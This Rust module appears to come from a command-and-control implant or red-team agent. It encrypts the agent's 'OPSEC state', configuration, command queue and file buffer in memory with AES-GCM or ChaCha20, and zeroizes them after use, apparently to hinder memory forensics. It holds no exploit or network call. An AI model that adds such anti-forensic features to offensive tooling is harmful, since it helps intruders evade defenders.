use zeroize::Zeroize;

// Conditionally compile the encryption backend
#[cfg(feature = "encryption-aes")]
mod aes_backend {
    use aes_gcm::{Aes256Gcm, Key, Nonce};
    use aes_gcm::aead::{AeadCore, Aead, OsRng, KeyInit};
    use zeroize::Zeroize;

    pub struct Protector {
        key: Key<Aes256Gcm>,
    }

    impl Protector {
        pub fn new() -> Self {
            Self { key: Aes256Gcm::generate_key(OsRng) }
        }

        pub fn encrypt(&self, plaintext: &[u8]) -> Result<(Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
            let cipher = Aes256Gcm::new(&self.key);
            let nonce_bytes = Aes256Gcm::generate_nonce(&mut OsRng);
            let ciphertext_and_tag = cipher.encrypt(&nonce_bytes, plaintext)
                .map_err(|e| Box::new(std::io::Error::new(std::io::ErrorKind::Other, format!("AES encryption failed: {:?}", e))) as Box<dyn std::error::Error>)?;
            Ok((nonce_bytes.to_vec(), ciphertext_and_tag))
        }

        pub fn decrypt(&self, nonce_bytes: &[u8], ciphertext_and_tag: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
            let cipher = Aes256Gcm::new(&self.key);
            let nonce = Nonce::from_slice(nonce_bytes);
            Ok(cipher.decrypt(nonce, ciphertext_and_tag)
                .map_err(|e| Box::new(std::io::Error::new(std::io::ErrorKind::Other, format!("AES decryption failed: {:?}", e))) as Box<dyn std::error::Error>)?)
        }

        pub fn zeroize(&mut self) {
            self.key.as_mut_slice().zeroize();
        }
    }
}

#[cfg(feature = "encryption-chacha")]
mod chacha_backend {
    use chacha20poly1305::{
        aead::{Aead, AeadCore, KeyInit, OsRng},
        ChaCha20Poly1305, Key, Nonce,
    };
    use zeroize::Zeroize;

    pub struct Protector {
        key: Key,
    }

    impl Protector {
        pub fn new() -> Self {
            Self {
                key: ChaCha20Poly1305::generate_key(&mut OsRng),
            }
        }

        pub fn encrypt(&self, plaintext: &[u8]) -> Result<(Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
            let cipher = ChaCha20Poly1305::new(&self.key);
            let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
            let ciphertext = cipher.encrypt(&nonce, plaintext)
                .map_err(|e| Box::new(std::io::Error::new(std::io::ErrorKind::Other, format!("ChaCha20 encryption failed: {:?}", e))) as Box<dyn std::error::Error>)?;
            Ok((nonce.to_vec(), ciphertext))
        }

        pub fn decrypt(&self, nonce_bytes: &[u8], ciphertext: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
            let cipher = ChaCha20Poly1305::new(&self.key);
            let nonce = Nonce::from_slice(nonce_bytes);
            let plaintext = cipher.decrypt(nonce, ciphertext)
                .map_err(|e| Box::new(std::io::Error::new(std::io::ErrorKind::Other, format!("ChaCha20 decryption failed: {:?}", e))) as Box<dyn std::error::Error>)?;
            Ok(plaintext)
        }

        pub fn zeroize(&mut self) {
            self.key.zeroize();
        }
    }
}

// Default fallback - use AES if no feature is enabled
#[cfg(not(any(feature = "encryption-aes", feature = "encryption-chacha")))]
mod aes_backend {
    use aes_gcm::{Aes256Gcm, Key, Nonce};
    use aes_gcm::aead::{AeadCore, Aead, OsRng, KeyInit};
    use zeroize::Zeroize;

    pub struct Protector {
        key: Key<Aes256Gcm>,
    }

    impl Protector {
        pub fn new() -> Self {
            Self { key: Aes256Gcm::generate_key(OsRng) }
        }

        pub fn encrypt(&self, plaintext: &[u8]) -> Result<(Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
            let cipher = Aes256Gcm::new(&self.key);
            let nonce_bytes = Aes256Gcm::generate_nonce(&mut OsRng);
            let ciphertext_and_tag = cipher.encrypt(&nonce_bytes, plaintext)
                .map_err(|e| Box::new(std::io::Error::new(std::io::ErrorKind::Other, format!("AES encryption failed: {:?}", e))) as Box<dyn std::error::Error>)?;
            Ok((nonce_bytes.to_vec(), ciphertext_and_tag))
        }

        pub fn decrypt(&self, nonce_bytes: &[u8], ciphertext_and_tag: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
            let cipher = Aes256Gcm::new(&self.key);
            let nonce = Nonce::from_slice(nonce_bytes);
            Ok(cipher.decrypt(nonce, ciphertext_and_tag)
                .map_err(|e| Box::new(std::io::Error::new(std::io::ErrorKind::Other, format!("AES decryption failed: {:?}", e))) as Box<dyn std::error::Error>)?)
        }

        pub fn zeroize(&mut self) {
            self.key.as_mut_slice().zeroize();
        }
    }
}

// Choose the backend based on features
#[cfg(feature = "encryption-aes")]
use aes_backend as backend;

#[cfg(all(feature = "encryption-chacha", not(feature = "encryption-aes")))]
use chacha_backend as backend;

#[cfg(not(any(feature = "encryption-aes", feature = "encryption-chacha")))]
use aes_backend as backend;

// True in-memory protection - only encrypted storage
pub struct MemoryProtector {
    protector: backend::Protector,
    encrypted_opsec_state: Option<(Vec<u8>, Vec<u8>)>,
    encrypted_config: Option<(Vec<u8>, Vec<u8>)>,
    encrypted_command_queue: Vec<(Vec<u8>, Vec<u8>)>,
    encrypted_file_buffer: Option<(Vec<u8>, Vec<u8>)>,
}

impl MemoryProtector {
    pub fn new() -> Self {
        Self {
            protector: backend::Protector::new(),
            encrypted_opsec_state: None,
            encrypted_config: None,
            encrypted_command_queue: Vec::new(),
            encrypted_file_buffer: None,
        }
    }

    //  Store encrypted OPSEC state
    pub fn encrypt_opsec_state(&mut self, opsec_state: &crate::opsec::OpsecState) -> Result<(), Box<dyn std::error::Error>> {
        let serialized = bincode::encode_to_vec(opsec_state, bincode::config::standard())?;
        let (nonce, ciphertext) = self.protector.encrypt(&serialized)?;
        self.encrypted_opsec_state = Some((nonce, ciphertext));
        Ok(())
    }

    //  Decrypt OPSEC state (returns owned data that gets zeroized)
    pub fn decrypt_opsec_state(&self) -> Result<crate::opsec::OpsecState, Box<dyn std::error::Error>> {
        if let Some((nonce, ciphertext)) = &self.encrypted_opsec_state {
            let decrypted = self.protector.decrypt(nonce, ciphertext)?;
            let (opsec_state, _): (crate::opsec::OpsecState, usize) = bincode::decode_from_slice(&decrypted, bincode::config::standard())?;
            Ok(opsec_state)
        } else {
            Err("No encrypted OPSEC state found".into())
        }
    }

    //  Temporary access with immediate cleanup
    pub fn with_opsec_state<F, R>(&self, f: &F) -> Result<R, Box<dyn std::error::Error>>
    where F: Fn(&crate::opsec::OpsecState) -> R,
    {
        if let Some((nonce, ciphertext)) = &self.encrypted_opsec_state {
            let decrypted = self.protector.decrypt(nonce, ciphertext)?;
            let (mut opsec_state, _): (crate::opsec::OpsecState, usize) = bincode::decode_from_slice(&decrypted, bincode::config::standard())?;
            let result = f(&opsec_state);
            
            //  Immediately zeroize decrypted data
            opsec_state.zeroize();
            std::mem::drop(opsec_state);
            
            Ok(result)
        } else {
            Err("No encrypted OPSEC state found".into())
        }
    }

    //  Mutable access with immediate cleanup
    pub fn with_opsec_state_mut<F, R>(&mut self, f: F) -> Result<R, Box<dyn std::error::Error>>
    where F: FnOnce(&mut crate::opsec::OpsecState) -> R,
    {
        let (nonce, ciphertext) = self.encrypted_opsec_state.as_ref().ok_or("No encrypted OPSEC state found")?;
        let mut decrypted_bytes = self.protector.decrypt(nonce, ciphertext)?;
        let (mut state, _): (crate::opsec::OpsecState, usize) = bincode::decode_from_slice(&decrypted_bytes, bincode::config::standard())?;
        
        decrypted_bytes.zeroize();
        
        let result = f(&mut state);
        
        let mut serialized_bytes = bincode::encode_to_vec(&state, bincode::config::standard())?;
        let (new_nonce, new_ciphertext) = self.protector.encrypt(&serialized_bytes)?;
        
        serialized_bytes.zeroize();
        
        self.encrypted_opsec_state = Some((new_nonce, new_ciphertext));
        
        state.zeroize();
        Ok(result)
    }

    //  Config methods
    pub fn encrypt_config(&mut self, config: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let (nonce, ciphertext) = self.protector.encrypt(config)?;
        self.encrypted_config = Some((nonce, ciphertext));
        Ok(())
    }

    pub fn with_config<F, R>(&self, f: F) -> Result<R, Box<dyn std::error::Error>>
    where F: FnOnce(&[u8]) -> R,
    {
        if let Some((nonce, ciphertext)) = &self.encrypted_config {
            let mut decrypted = self.protector.decrypt(nonce, ciphertext)?;
            let result = f(&decrypted);
            decrypted.zeroize();
            Ok(result)
        } else {
            Err("No encrypted config found".into())
        }
    }

    //  Command queue methods
    pub fn add_command(&mut self, command: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let (nonce, ciphertext) = self.protector.encrypt(command)?;
        self.encrypted_command_queue.push((nonce, ciphertext));
        Ok(())
    }

    pub fn drain_commands(&mut self) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
        let mut commands = Vec::new();
        for (nonce, ciphertext) in self.encrypted_command_queue.drain(..) {
            let mut decrypted = self.protector.decrypt(&nonce, &ciphertext)?;
            commands.push(decrypted.clone());
            decrypted.zeroize();
        }
        Ok(commands)
    }

    //  Complete cleanup
    pub fn zeroize(&mut self) {
        self.protector.zeroize();
        
        if let Some((ref mut n, ref mut c)) = self.encrypted_opsec_state {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_opsec_state = None;
        
        if let Some((ref mut n, ref mut c)) = self.encrypted_config {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_config = None;
        
        for (ref mut n, ref mut c) in &mut self.encrypted_command_queue {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_command_queue.clear();
        
        if let Some((ref mut n, ref mut c)) = self.encrypted_file_buffer {
            n.zeroize();
            c.zeroize();
        }
        self.encrypted_file_buffer = None;
    }
}